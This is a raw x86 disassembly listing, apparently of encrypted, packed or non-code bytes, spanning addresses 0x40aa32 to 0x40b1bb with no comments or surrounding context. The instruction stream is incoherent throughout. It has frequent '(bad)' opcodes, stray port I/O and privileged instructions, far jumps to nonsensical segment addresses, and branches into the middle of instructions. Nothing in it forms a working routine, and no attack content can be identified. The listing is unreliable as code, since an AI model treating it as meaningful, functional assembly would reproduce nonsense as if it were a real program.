  40aa32:	std    
  40aa33:	ret    
  40aa34:	push   ebx
  40aa35:	enter  0x36c6,0xbd
  40aa39:	xor    BYTE PTR [ebp+0x61],al
  40aa3c:	div    DWORD PTR [ecx]
  40aa3e:	mov    edi,DWORD PTR [esi+0x4f]
  40aa41:	jo     0x40aa44
  40aa43:	cmp    BYTE PTR [edx+0x3f],dl
  40aa46:	loop   0x40aa6d
  40aa48:	xchg   ecx,eax
  40aa49:	call   0x7ebf7ebe
  40aa4e:	lods   al,BYTE PTR ds:[esi]
  40aa4f:	mov    bh,0x8
  40aa51:	pusha  
  40aa52:	mov    bl,0x4a
  40aa54:	ja     0x40aac1
  40aa56:	dec    ebp
  40aa57:	sbb    BYTE PTR [ecx],ch
  40aa59:	and    ebx,esi
  40aa5b:	cmp    ecx,eax
  40aa5d:	xchg   ebp,eax
  40aa5e:	push   0x5e0bb109
  40aa63:	or     eax,0x28fc4b4a
  40aa68:	inc    eax
  40aa69:	xchg   edi,eax
  40aa6a:	shr    DWORD PTR [ebp+0x12b9b0e8],cl
  40aa70:	ins    BYTE PTR es:[edi],dx
  40aa71:	pop    es
  40aa72:	xor    edi,esi
  40aa74:	push   eax
  40aa75:	adc    al,0xeb
  40aa77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa78:	into   
  40aa79:	ret    0xb3c1
  40aa7c:	sub    BYTE PTR [ebx-0x436750b8],bl
  40aa82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa83:	mov    cl,0xa0
  40aa85:	jecxz  0x40aa0f
  40aa87:	or     ebx,DWORD PTR [eax-0x41fd21a6]
  40aa8d:	push   ebp
  40aa8e:	shl    BYTE PTR [ebp+eiz*1+0x6e539d42],cl
  40aa95:	sub    eax,0x2593c21e
  40aa9a:	out    0xb,al
  40aa9c:	pop    ebp
  40aa9d:	and    edx,ebx
  40aa9f:	in     eax,0xde
  40aaa1:	pop    ss
  40aaa2:	and    esi,DWORD PTR [edi+0xc6d00fb]
  40aaa8:	ret    
  40aaa9:	or     eax,0xcdc328d2
  40aaae:	loop   0x40aab3
  40aab0:	sbb    eax,0x42e3f191
  40aab5:	out    dx,al
  40aab6:	loope  0x40aaf3
  40aab8:	pop    eax
  40aab9:	adc    al,0xd1
  40aabb:	clc    
  40aabc:	(bad)  
  40aabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aabe:	cmp    al,0xe0
  40aac0:	xor    dh,bh
  40aac2:	sbb    al,BYTE PTR [esi+edi*4]
  40aac5:	push   0xa27fa034
  40aaca:	xor    bh,0xe
  40aacd:	repnz stc 
  40aacf:	scas   eax,DWORD PTR es:[edi]
  40aad0:	mov    ah,0xc2
  40aad2:	dec    eax
  40aad3:	icebp  
  40aad4:	jl     0x40ab45
  40aad6:	mov    ds,WORD PTR [edi+0x3e]
  40aad9:	(bad)  
  40aadb:	pop    ds
  40aadc:	adc    edi,DWORD PTR [edx+0x502e6285]
  40aae2:	dec    ebp
  40aae3:	pop    es
  40aae4:	push   ebx
  40aae5:	aam    0x90
  40aae7:	or     BYTE PTR [ebp+0x7f],0x7a
  40aaeb:	test   eax,0x1d1983f4
  40aaf0:	pop    esp
  40aaf1:	lods   eax,DWORD PTR ds:[esi]
  40aaf2:	cmp    al,0x56
  40aaf4:	mov    DWORD PTR [esi+0x2a],ecx
  40aaf7:	cmp    DWORD PTR [eax+0x592a91b5],ecx
  40aafd:	push   ss
  40aafe:	xchg   edi,eax
  40aaff:	loope  0x40aaa9
  40ab01:	ins    BYTE PTR es:[edi],dx
  40ab02:	and    edi,DWORD PTR [edx+0x11a0ffdb]
  40ab08:	adc    DWORD PTR [ebx],ecx
  40ab0a:	mov    cs,WORD PTR [ebp-0xc4ab4ca]
  40ab10:	cmp    DWORD PTR [ebp+0x7f6caac0],edx
  40ab16:	test   BYTE PTR [esi+0x62],bl
  40ab19:	or     bh,dh
  40ab1b:	popa   
  40ab1c:	addr16 cmp al,0x56
  40ab1f:	fs add eax,0x6d2a2c42
  40ab25:	pusha  
  40ab26:	ret    
  40ab27:	inc    esi
  40ab28:	rcl    BYTE PTR [ebx-0x43b196a8],1
  40ab2e:	test   BYTE PTR [edi+ebx*8],cl
  40ab31:	(bad)  
  40ab32:	rol    dh,cl
  40ab34:	inc    esp
  40ab35:	push   ecx
  40ab36:	aad    0xc0
  40ab38:	dec    eax
  40ab39:	lds    esi,FWORD PTR [esi+0x4a]
  40ab3c:	scas   eax,DWORD PTR es:[edi]
  40ab3d:	aad    0xa9
  40ab3f:	scas   al,BYTE PTR es:[edi]
  40ab40:	inc    DWORD PTR [ecx-0x496943a2]
  40ab46:	jo     0x40ab2d
  40ab48:	push   edi
  40ab49:	hlt    
  40ab4a:	xor    dh,BYTE PTR [edx]
  40ab4c:	ins    BYTE PTR es:[edi],dx
  40ab4d:	in     al,dx
  40ab4e:	jecxz  0x40ab3e
  40ab50:	mov    dh,0x57
  40ab52:	add    al,0xd7
  40ab54:	pop    es
  40ab55:	add    BYTE PTR ds:0x96d596f,0x30
  40ab5c:	(bad)  
  40ab5e:	clc    
  40ab5f:	(bad)  
  40ab60:	loopne 0x40abc8
  40ab62:	inc    edx
  40ab63:	mov    edx,0x6f416781
  40ab68:	neg    BYTE PTR [ebx-0x522122e7]
  40ab6e:	fistp  WORD PTR [edx-0x647ab5f5]
  40ab74:	inc    edi
  40ab75:	push   es
  40ab76:	add    ch,al
  40ab78:	or     ebp,DWORD PTR [ebp+0x53]
  40ab7b:	inc    edx
  40ab7c:	or     BYTE PTR [ecx+0x57d2dc74],ch
  40ab82:	jns    0x40abb2
  40ab84:	ds sbb eax,0x41191479
  40ab8a:	pop    ss
  40ab8b:	push   ebx
  40ab8c:	sub    al,ch
  40ab8e:	sti    
  40ab8f:	pop    edi
  40ab90:	or     BYTE PTR [eax-0x61],0xc8
  40ab94:	in     al,0xba
  40ab96:	(bad)  
  40ab97:	shr    ecx,1
  40ab99:	pop    ds
  40ab9a:	sbb    al,0xe9
  40ab9c:	loope  0x40abfd
  40ab9e:	sbb    DWORD PTR [ecx+0x1b520d51],ecx
  40aba4:	into   
  40aba5:	jmp    0x9089:0xbe3cbd7d
  40abac:	cmp    edx,DWORD PTR [edi+0x5ef4a96d]
  40abb2:	or     al,0xed
  40abb4:	shl    BYTE PTR [edx-0x65],cl
  40abb7:	dec    esi
  40abb8:	shl    BYTE PTR [ebx-0x12],cl
  40abbb:	test   al,0x90
  40abbd:	xchg   esi,eax
  40abbe:	add    eax,0x71adc3d0
  40abc3:	cmp    eax,0x4570d737
  40abc8:	fiadd  DWORD PTR [edx-0x6d8f582d]
  40abce:	mov    eax,ds:0x14c6e2cc
  40abd3:	sahf   
  40abd4:	adc    edi,0xc0889b22
  40abda:	add    esp,0x39
  40abdd:	push   ss
  40abde:	add    eax,0x9f7013ed
  40abe3:	ins    BYTE PTR es:[edi],dx
  40abe4:	je     0x40abc5
  40abe6:	dec    esi
  40abe7:	jns    0x40ab82
  40abe9:	push   ss
  40abea:	jo     0x40ac26
  40abec:	dec    esi
  40abed:	sbb    al,0x1a
  40abef:	adc    ah,ch
  40abf1:	sub    dh,BYTE PTR [ecx+0x7f75c3de]
  40abf7:	xor    WORD PTR [ebx+esi*8+0x3b70052b],si
  40abff:	jo     0x40ac3a
  40ac01:	add    cl,ah
  40ac03:	call   0xaadc3305
  40ac08:	sub    DWORD PTR [ebx-0x77],esp
  40ac0b:	fst    DWORD PTR [ecx+0x2a7fe9c6]
  40ac11:	adc    al,0x3
  40ac13:	jne    0x40abd0
  40ac15:	into   
  40ac16:	xchg   esp,eax
  40ac17:	cs xchg esi,eax
  40ac19:	add    edi,ebp
  40ac1b:	clc    
  40ac1c:	out    0xae,al
  40ac1e:	out    dx,al
  40ac1f:	mov    ds:0xef349cbb,al
  40ac24:	pop    ds
  40ac25:	pop    ebx
  40ac26:	pusha  
  40ac27:	(bad)  
  40ac28:	cmp    ebp,DWORD PTR [edi-0x10]
  40ac2b:	mov    bl,dl
  40ac2d:	inc    esi
  40ac2e:	(bad)  [eax]
  40ac30:	fs mov eax,0x262d5cd8
  40ac36:	div    DWORD PTR [ecx]
  40ac38:	sub    edi,DWORD PTR [edi+eiz*8-0x54ad3434]
  40ac3f:	push   0xe752c3b
  40ac44:	ret    
  40ac45:	push   ebp
  40ac46:	(bad)  
  40ac47:	sub    al,0xb3
  40ac49:	aas    
  40ac4a:	adc    eax,0x36951709
  40ac4f:	sar    DWORD PTR [esi+0x6b6cea05],1
  40ac55:	loop   0x40aca7
  40ac57:	xor    eax,0xec1b9238
  40ac5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac5d:	sbb    DWORD PTR [ecx+0x2ac8b2f0],0xffffffa7
  40ac64:	mov    eax,ds:0x620cef62
  40ac69:	dec    ebp
  40ac6a:	test   eax,0xbd753440
  40ac6f:	pop    ss
  40ac70:	push   ecx
  40ac71:	fstp   QWORD PTR [ebx+0x12]
  40ac74:	sub    bl,BYTE PTR [eax+0x69be7fb5]
  40ac7a:	shl    BYTE PTR [ebp-0x46],cl
  40ac7d:	jmp    0x40ace8
  40ac7f:	lahf   
  40ac80:	inc    ecx
  40ac81:	add    BYTE PTR [edx+0x19e2d554],ah
  40ac87:	mov    eax,ds:0xa2e83873
  40ac8c:	(bad)  [ecx]
  40ac8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac8f:	sbb    DWORD PTR [edx+esi*8+0x3],esp
  40ac93:	push   eax
  40ac94:	in     al,dx
  40ac95:	mov    ch,0xa6
  40ac97:	mov    edi,0xda0950eb
  40ac9c:	hlt    
  40ac9d:	mov    eax,0x7b46e4e
  40aca2:	mov    ebp,0x23af896c
  40aca7:	mov    dh,0x65
  40aca9:	das    
  40acaa:	sub    eax,0x550ffe49
  40acaf:	jecxz  0x40ace1
  40acb1:	fimul  DWORD PTR [eax-0x3d]
  40acb4:	or     edx,DWORD PTR [edx]
  40acb6:	scas   al,BYTE PTR es:[edi]
  40acb7:	add    cl,BYTE PTR [esi-0x5b]
  40acba:	rcl    BYTE PTR [ecx+0x7a],1
  40acbd:	jbe    0x40aca2
  40acbf:	scas   al,BYTE PTR es:[edi]
  40acc0:	jmp    0x40ad14
  40acc2:	call   0x82d15f3f
  40acc7:	fisubr DWORD PTR [ebp-0x376ee344]
  40accd:	mov    ebx,0x99a8ea2f
  40acd2:	daa    
  40acd3:	jp     0x40acab
  40acd5:	pop    esp
  40acd6:	jle    0x40ad25
  40acd8:	loop   0x40ac7b
  40acda:	inc    edx
  40acdc:	mov    edx,ebx
  40acde:	scas   eax,DWORD PTR es:[edi]
  40acdf:	jge    0x40ad55
  40ace1:	push   esp
  40ace2:	(bad)  [edx+0x43cd4f]
  40ace8:	mov    eax,ds:0x41add0d2
  40aced:	(bad)  
  40acf1:	ins    DWORD PTR es:[edi],dx
  40acf2:	jno    0x40ad39
  40acf4:	add    eax,0x167b588b
  40acf9:	fdivr  DWORD PTR [esi+0x11ce9748]
  40acff:	int    0x4
  40ad01:	sti    
  40ad02:	test   eax,0xacc5b42f
  40ad07:	xor    al,0x9d
  40ad09:	inc    ecx
  40ad0a:	jnp    0x40ac9d
  40ad0c:	jns    0x40ad4a
  40ad0e:	mov    ds,edi
  40ad10:	adc    ch,BYTE PTR ds:0xcc07c87e
  40ad16:	in     eax,0x54
  40ad18:	and    BYTE PTR [edi+eax*4+0x34],0x94
  40ad1d:	psubusw mm1,QWORD PTR [edx]
  40ad20:	retf   
  40ad21:	sbb    eax,0x13728c75
  40ad26:	jno    0x40ad98
  40ad28:	pop    ds
  40ad29:	pusha  
  40ad2a:	es daa 
  40ad2c:	idiv   BYTE PTR [ebp+esi*4-0xb]
  40ad30:	mov    esi,0xe9b06990
  40ad35:	(bad)  
  40ad36:	jmp    0x40ad43
  40ad38:	mov    BYTE PTR [esi+eax*8+0x25],bh
  40ad3c:	adc    edi,DWORD PTR [edx+0x25ab3649]
  40ad42:	xchg   edx,eax
  40ad43:	push   es
  40ad44:	mov    ?,WORD PTR [ebp-0x31]
  40ad47:	gs mov ebx,0x5103972b
  40ad4d:	adc    ah,BYTE PTR [ecx+0x699c532f]
  40ad53:	or     BYTE PTR [ebx-0x47],cl
  40ad56:	jne    0x40ad69
  40ad58:	inc    ebx
  40ad59:	fdiv   st,st(7)
  40ad5b:	adc    eax,0x2a407f31
  40ad60:	mov    cl,0x17
  40ad62:	dec    ecx
  40ad63:	pop    eax
  40ad64:	fst    DWORD PTR [ebp-0x6f]
  40ad67:	mov    esp,DWORD PTR [ebx-0x44]
  40ad6a:	std    
  40ad6b:	dec    esi
  40ad6c:	mov    WORD PTR [esi-0x1db3232e],ds
  40ad72:	popa   
  40ad73:	ss aaa 
  40ad75:	in     eax,0x16
  40ad77:	pop    ebx
  40ad78:	mov    WORD PTR [edi+0x47],gs
  40ad7b:	mov    edi,0xece1a764
  40ad80:	cmp    DWORD PTR [edx-0x2930a118],0x4c
  40ad87:	rcl    DWORD PTR [edx-0x39a2e776],0x80
  40ad8e:	sub    eax,0xe471ca69
  40ad93:	popf   
  40ad94:	pop    ebp
  40ad95:	cmp    ah,cl
  40ad97:	dec    edi
  40ad98:	push   0xb72c9c7d
  40ad9d:	inc    edx
  40ad9e:	aaa    
  40ad9f:	sub    BYTE PTR [esp+edx*8],dh
  40ada2:	not    DWORD PTR [esi-0x62]
  40ada5:	add    ecx,DWORD PTR [ecx]
  40ada7:	or     ebx,DWORD PTR [edx+0x3f]
  40adaa:	out    0xaf,al
  40adac:	retf   0x332a
  40adaf:	clc    
  40adb0:	pusha  
  40adb1:	add    al,0xb8
  40adb3:	inc    ebx
  40adb4:	rol    DWORD PTR [edx],1
  40adb6:	mov    ds:0x8c29fe2d,al
  40adbb:	cmp    dl,BYTE PTR [edi+0x46]
  40adbe:	neg    DWORD PTR [edx+0x46]
  40adc1:	pop    esi
  40adc2:	sar    DWORD PTR [ebp-0x2f6f12f2],0x83
  40adc9:	mov    bl,0xc5
  40adcb:	pop    ds
  40adcc:	in     eax,0xb5
  40adce:	sbb    al,0xf3
  40add0:	jg     0x40ada7
  40add2:	inc    edi
  40add3:	call   0x1f42839b
  40add8:	sub    ebp,DWORD PTR [esi-0x6f]
  40addb:	repnz test DWORD PTR [ebx-0x2a268ab4],esi
  40ade2:	cmp    BYTE PTR [ebx-0x7e],cl
  40ade5:	loopne 0x40ada4
  40ade7:	mov    ch,0xd8
  40ade9:	sbb    ah,BYTE PTR [eax+edx*1-0x16400f10]
  40adf0:	cdq    
  40adf1:	out    0xdf,eax
  40adf3:	cmc    
  40adf4:	ficomp WORD PTR [esp+esi*2]
  40adf7:	jg     0x40ada6
  40adf9:	and    BYTE PTR [edx-0xe],bh
  40adfc:	leave  
  40adfd:	or     bh,dl
  40adff:	icebp  
  40ae00:	lahf   
  40ae01:	pop    ss
  40ae02:	jns    0x40ae01
  40ae04:	sbb    eax,0xeb26e0a2
  40ae09:	daa    
  40ae0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae0b:	out    0x69,eax
  40ae0d:	mov    esi,0xcafa15e
  40ae12:	xchg   BYTE PTR [edx+0x23],bh
  40ae15:	fild   WORD PTR [eax-0x11]
  40ae18:	mov    al,0xaa
  40ae1a:	adc    esi,ebp
  40ae1c:	xor    ebx,esp
  40ae1e:	addr16 fwait
  40ae20:	bound  eax,QWORD PTR [ecx+0x2c]
  40ae23:	mov    ebp,0xfa998be9
  40ae28:	outs   dx,BYTE PTR ds:[esi]
  40ae29:	int    0x49
  40ae2b:	icebp  
  40ae2c:	sbb    bl,dh
  40ae2e:	push   esp
  40ae2f:	or     al,0x19
  40ae31:	xchg   BYTE PTR [esi],ah
  40ae33:	pop    ss
  40ae34:	clc    
  40ae35:	test   al,0xa0
  40ae37:	lahf   
  40ae38:	push   esi
  40ae39:	adc    al,ch
  40ae3b:	shl    DWORD PTR [eax-0x42],cl
  40ae3e:	dec    esp
  40ae3f:	clc    
  40ae40:	getsec 
  40ae42:	sahf   
  40ae43:	test   ch,ch
  40ae45:	pop    ecx
  40ae46:	mov    ah,BYTE PTR [eax]
  40ae48:	pusha  
  40ae49:	out    0x41,al
  40ae4b:	cmp    al,BYTE PTR [ecx]
  40ae4d:	es jl  0x40ae74
  40ae50:	and    cl,ah
  40ae52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae53:	mov    ds:0x7aab5bbb,ax
  40ae59:	in     eax,0xd4
  40ae5b:	pop    esp
  40ae5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae5d:	fxam   
  40ae5f:	jo     0x40ae30
  40ae61:	mov    eax,0xb49e306d
  40ae66:	jmp    0xa6d3df5e
  40ae6b:	inc    ecx
  40ae6c:	or     eax,0xdeefb6cb
  40ae71:	loop   0x40ae9b
  40ae73:	call   0x724:0x257d4937
  40ae7a:	(bad)  
  40ae7b:	adc    ecx,DWORD PTR [ecx+0x21c0088e]
  40ae81:	xchg   ax,ax
  40ae83:	outs   dx,BYTE PTR ds:[esi]
  40ae84:	xchg   edi,eax
  40ae85:	xchg   BYTE PTR [esp+ebx*4],bl
  40ae88:	pop    edx
  40ae89:	or     BYTE PTR [edx-0x31],ch
  40ae8c:	aam    0x2c
  40ae8e:	push   0x38
  40ae90:	cmp    BYTE PTR [ecx+0x1f],ch
  40ae93:	xchg   BYTE PTR [esi],bh
  40ae95:	dec    ebp
  40ae96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae97:	cmp    dh,dl
  40ae99:	push   edi
  40ae9a:	inc    esi
  40ae9b:	push   edx
  40ae9c:	sbb    ebp,DWORD PTR [ecx+0x6712bc64]
  40aea2:	pop    edx
  40aea3:	call   0xb931c372
  40aea8:	or     DWORD PTR [ebx+0x2d0b25c3],ebx
  40aeae:	fild   QWORD PTR [ecx+0x71]
  40aeb1:	mov    ecx,0x16ba5cd1
  40aeb6:	jle    0x40ae87
  40aeb8:	and    eax,0x55447189
  40aebd:	mov    DWORD PTR [ebx+0xd],ebx
  40aec0:	mov    edx,0x9a34770b
  40aec5:	adc    edx,edi
  40aec7:	scas   eax,DWORD PTR es:[edi]
  40aec8:	fwait
  40aec9:	bound  ecx,QWORD PTR [ebx]
  40aecb:	pop    eax
  40aecc:	aad    0x90
  40aece:	sbb    DWORD PTR [esi],edi
  40aed0:	pop    ds
  40aed1:	adc    dl,BYTE PTR [ebx]
  40aed3:	fwait
  40aed4:	xchg   esi,eax
  40aed5:	mov    bh,0x82
  40aed7:	xor    al,0xb
  40aed9:	retf   
  40aeda:	mov    ds:0x2dffbd44,eax
  40aedf:	push   ds
  40aee0:	fcomi  st,st(3)
  40aee2:	push   ecx
  40aee3:	cmp    BYTE PTR [ebx+0x10e1fbb3],ah
  40aee9:	sbb    edi,esi
  40aeeb:	sar    BYTE PTR [esi+0x91d1744],0xec
  40aef2:	(bad)
  40aef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aef6:	ret    0x6cf5
  40aef9:	pop    edx
  40aefa:	mov    eax,ds:0xda3e63e
  40aeff:	dec    edi
  40af00:	aad    0xab
  40af02:	int    0x5e
  40af04:	or     eax,0x52dd67d3
  40af09:	icebp  
  40af0a:	fld    DWORD PTR [eax]
  40af0c:	mov    eax,0xf4e4dada
  40af11:	sub    ah,BYTE PTR [edx-0x77]
  40af14:	fidiv  DWORD PTR [ebx+0x4e5b71a5]
  40af1a:	not    BYTE PTR [edi+esi*8]
  40af1d:	add    al,0x9b
  40af1f:	cmp    eax,0x4ae7a8d6
  40af24:	jnp    0x40aeee
  40af26:	lods   al,BYTE PTR ds:[esi]
  40af27:	sub    ch,BYTE PTR [edx+edx*8+0x62f27fb0]
  40af2e:	scas   eax,DWORD PTR es:[edi]
  40af2f:	call   0x3ca4:0x893ba328
  40af36:	fstp   QWORD PTR [ebp-0x37]
  40af39:	xchg   edx,eax
  40af3a:	sub    eax,0xecb36715
  40af3f:	mov    eax,ss:0x14b226de
  40af45:	mov    ch,0x9e
  40af47:	cmp    ecx,0x29
  40af4a:	scas   eax,DWORD PTR es:[edi]
  40af4b:	jmp    0x40aeec
  40af4d:	add    DWORD PTR ds:0x5bd44edb,edi
  40af53:	jmp    0x855c:0xc8afb55
  40af5a:	pop    edx
  40af5b:	jno    0x40af16
  40af5d:	into   
  40af5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af5f:	pop    edx
  40af60:	ret    0x5483
  40af63:	ss push edx
  40af65:	adc    ch,BYTE PTR [ebp-0x37]
  40af68:	jae    0x40af0f
  40af6a:	pop    esi
  40af6b:	xor    eax,0xf4a5e312
  40af70:	jmp    0x50ae:0xf204cc68
  40af77:	cmp    al,0x7e
  40af79:	sbb    BYTE PTR [edx+0x65],ch
  40af7c:	cmp    DWORD PTR [esi-0x9],eax
  40af7f:	neg    DWORD PTR [esi-0x4d]
  40af82:	or     BYTE PTR [eax-0x28],ah
  40af85:	xor    BYTE PTR [eax+0x61],cl
  40af88:	mov    es,WORD PTR [ebp-0x43f20a7b]
  40af8e:	mov    ds:0x35ff3550,al
  40af93:	(bad)  
  40af94:	jns    0x40afb7
  40af96:	mov    ebp,0xea0a9445
  40af9b:	(bad)  
  40af9c:	and    BYTE PTR [ebp-0x71],al
  40af9f:	pusha  
  40afa0:	jo     0x40af6e
  40afa2:	mov    ah,0x5
  40afa4:	out    dx,al
  40afa5:	pop    esp
  40afa6:	push   edi
  40afa7:	mov    bl,0xf9
  40afa9:	loop   0x40af86
  40afab:	mov    bh,0x75
  40afad:	test   ch,bl
  40afaf:	inc    edi
  40afb0:	xchg   esp,eax
  40afb1:	fcomp  DWORD PTR [eax]
  40afb3:	xor    DWORD PTR [edi+0x17],esp
  40afb6:	scas   al,BYTE PTR es:[edi]
  40afb7:	nop
  40afb8:	cmp    DWORD PTR [esi],ecx
  40afba:	xlat   BYTE PTR ds:[ebx]
  40afbb:	enter  0x5c0,0x3a
  40afbf:	mov    al,0x8b
  40afc1:	test   al,0xcd
  40afc3:	pop    edi
  40afc4:	cmp    al,0x20
  40afc6:	pop    ebp
  40afc7:	ds pmullw mm5,mm6
  40afcb:	jnp    0x40af4d
  40afcd:	pop    edx
  40afce:	pop    eax
  40afcf:	adc    esp,DWORD PTR [esi+0x6418e23a]
  40afd5:	aaa    
  40afd6:	(bad)
  40afda:	or     esi,DWORD PTR [ebx]
  40afdc:	(bad)  [ebx+0x48be4008]
  40afe2:	xchg   ebp,eax
  40afe3:	cli    
  40afe4:	add    DWORD PTR [esi+0xb2b4650],0xbd68b413
  40afee:	mov    ch,0xfc
  40aff0:	inc    esi
  40aff1:	cs loop 0x40b05e
  40aff4:	xchg   si,ax
  40aff6:	push   0xffffffa4
  40aff8:	test   BYTE PTR [eax-0x7d],0xb0
  40affc:	adc    eax,DWORD PTR [esi+0x0]
  40afff:	vaddss xmm1,xmm6,xmm5
  40b003:	mov    BYTE PTR [eax+0x6c],ch
  40b006:	dec    ebx
  40b007:	adc    BYTE PTR [ecx],ch
  40b009:	mov    DWORD PTR [edx],esp
  40b00b:	shr    BYTE PTR [eax-0x3faef247],0x9e
  40b012:	fidivr DWORD PTR ds:0xde5b2b1b
  40b018:	pusha  
  40b019:	cli    
  40b01a:	in     al,0xbf
  40b01c:	and    eax,0x987092b7
  40b021:	(bad)  
  40b022:	fld    TBYTE PTR ds:0xfeeaa810
  40b028:	fmulp  st(5),st
  40b02a:	fs inc eax
  40b02c:	xchg   edx,eax
  40b02d:	aam    0xcc
  40b02f:	(bad)  
  40b030:	bound  ecx,QWORD PTR [eax-0x4a]
  40b033:	imul   ebx,DWORD PTR [eax+0x5b1265aa],0xffffff80
  40b03a:	std    
  40b03b:	and    dh,bh
  40b03d:	and    al,0xf1
  40b03f:	ins    DWORD PTR es:[edi],dx
  40b040:	add    ch,dl
  40b042:	mov    bh,0xd1
  40b044:	xchg   bp,ax
  40b046:	inc    eax
  40b047:	lahf   
  40b048:	add    bh,BYTE PTR [edi+0x1fef02e3]
  40b04e:	push   edx
  40b04f:	lock lods al,BYTE PTR ds:[esi]
  40b051:	or     eax,DWORD PTR [ecx]
  40b053:	xchg   ecx,eax
  40b054:	cmc    
  40b055:	rol    BYTE PTR [ebx-0x60ad149b],cl
  40b05b:	ss icebp 
  40b05d:	pop    edx
  40b05e:	xchg   edx,eax
  40b05f:	loopne 0x40b03a
  40b061:	mov    esp,0x1a3af58b
  40b066:	mov    eax,ds:0x8884ce7c
  40b06b:	jae    0x40b006
  40b06d:	(bad)  
  40b06e:	jg     0x40b039
  40b070:	mov    ebx,esi
  40b072:	cdq    
  40b073:	mov    ds:0x4c9c5ee,al
  40b078:	nop
  40b079:	sbb    al,0x9
  40b07b:	jle    0x40b05a
  40b07d:	sbb    al,0x57
  40b07f:	dec    edi
  40b080:	fwait
  40b081:	lds    esp,FWORD PTR [ebp+0x65]
  40b084:	gs repz sbb eax,0x63a66520
  40b08b:	ja     0x40b0d2
  40b08d:	cmp    bh,BYTE PTR [esp+eax*2]
  40b090:	scas   eax,DWORD PTR es:[edi]
  40b091:	loopne 0x40b022
  40b093:	pop    ebx
  40b094:	lds    ebp,FWORD PTR [edi-0x18]
  40b097:	test   eax,0xde119229
  40b09c:	hlt    
  40b09d:	das    
  40b09e:	and    ebp,DWORD PTR [esi-0x243d875]
  40b0a4:	pop    ecx
  40b0a5:	arpl   sp,dx
  40b0a7:	mov    esi,esi
  40b0a9:	fs mov bl,al
  40b0ac:	aad    0xc3
  40b0ae:	xchg   BYTE PTR [edi-0x5d],bl
  40b0b1:	and    DWORD PTR [eax],esp
  40b0b3:	sub    ebx,esp
  40b0b5:	rcr    al,0x10
  40b0b8:	and    bl,BYTE PTR [edx+0x5b]
  40b0bb:	pop    ss
  40b0bc:	pusha  
  40b0bd:	or     ebx,DWORD PTR [esi-0x26]
  40b0c0:	adc    eax,0x3fbd9369
  40b0c5:	mov    ebx,0x1624ef1b
  40b0ca:	iret   
  40b0cb:	fidiv  DWORD PTR [eax+0x2fcdc4f8]
  40b0d1:	cli    
  40b0d2:	jmp    0x4c6d:0x7fdf001a
  40b0d9:	fs (bad) 
  40b0db:	shl    ah,1
  40b0dd:	rol    BYTE PTR [edi+eiz*1+0x233863c9],cl
  40b0e4:	fist   DWORD PTR [ebx]
  40b0e6:	adc    BYTE PTR [ebx+0x7e],ch
  40b0e9:	push   eax
  40b0ea:	inc    ebx
  40b0eb:	mov    edi,DWORD PTR [ebx-0x7c]
  40b0ee:	pop    ebp
  40b0ef:	neg    BYTE PTR [ecx+eiz*2]
  40b0f2:	fisubr WORD PTR [esi+0x4d4fb63d]
  40b0f8:	std    
  40b0f9:	cmp    eax,0xd55c15cd
  40b0fe:	nop
  40b0ff:	inc    edi
  40b100:	xchg   esp,eax
  40b101:	in     al,dx
  40b102:	dec    ecx
  40b103:	int3   
  40b104:	fucompp 
  40b106:	dec    esi
  40b107:	push   esp
  40b108:	daa    
  40b109:	les    edx,FWORD PTR [esi+0x1aa37acb]
  40b10f:	add    bh,BYTE PTR [ecx+ebx*1]
  40b112:	mov    BYTE PTR [ecx+edi*4],dh
  40b115:	adc    bl,BYTE PTR [ebp+0x1098c438]
  40b11b:	xchg   ecx,eax
  40b11c:	enter  0x1943,0x95
  40b120:	inc    ebx
  40b121:	xchg   esi,eax
  40b122:	sbb    BYTE PTR [ebp+0x7bd96a82],0xb1
  40b129:	pop    edx
  40b12a:	add    al,0x46
  40b12c:	mov    ds:0x2b80599b,al
  40b131:	xor    DWORD PTR [eax-0x673f4c2f],edi
  40b137:	das    
  40b138:	out    dx,al
  40b139:	cmp    ebp,ebx
  40b13b:	(bad)  
  40b13c:	fwait
  40b13d:	arpl   WORD PTR [edx+edi*4],cx
  40b140:	out    0xf4,al
  40b142:	mov    dh,0xd1
  40b144:	lock gs xchg ebx,eax
  40b147:	pop    ss
  40b148:	mov    ch,0x99
  40b14a:	out    0x33,al
  40b14c:	test   eax,0xa0a85af8
  40b151:	xchg   ecx,eax
  40b152:	push   eax
  40b153:	ss shl dh,1
  40b156:	ret    
  40b157:	scas   al,BYTE PTR es:[edi]
  40b158:	icebp  
  40b159:	push   ebx
  40b15a:	stos   DWORD PTR es:[edi],eax
  40b15b:	xchg   ebx,eax
  40b15c:	jno    0x40b106
  40b15e:	jne    0x40b139
  40b160:	mov    dh,0xda
  40b162:	test   bh,ch
  40b164:	repz out dx,eax
  40b166:	les    esi,FWORD PTR [eax-0x741e6ea4]
  40b16c:	push   ebp
  40b16d:	inc    ebp
  40b16e:	fwait
  40b16f:	sbb    al,0x9a
  40b171:	dec    eax
  40b172:	mov    ecx,0x723dfefe
  40b177:	cmp    DWORD PTR [ebp+0x64],eax
  40b17a:	mov    edi,0x1527a0e5
  40b17f:	iret   
  40b180:	hlt    
  40b181:	cmp    edx,ecx
  40b183:	push   ebx
  40b184:	mov    ds:0x6a0ccafc,eax
  40b189:	ss cmp al,0x13
  40b18c:	pop    edx
  40b18d:	fist   WORD PTR [ebp+0x31]
  40b190:	mov    eax,DWORD PTR [edx+eax*8]
  40b193:	pop    esp
  40b194:	test   eax,0x67727256
  40b199:	gs dec eax
  40b19b:	sbb    al,0xc5
  40b19d:	icebp  
  40b19e:	push   ss
  40b19f:	fdiv   QWORD PTR [eax]
  40b1a1:	push   esi
  40b1a2:	push   cs
  40b1a3:	and    DWORD PTR [ebx+edi*2-0x3ee2955c],0x73b8e7ea
  40b1ae:	push   edi
  40b1af:	jne    0x40b1ef
  40b1b1:	aad    0x71
  40b1b3:	fidiv  WORD PTR [ecx+0x3e982f7e]
  40b1b9:	jne    0x40b153
  40b1bb:	sbb    DWORD PTR [ebx],ebx
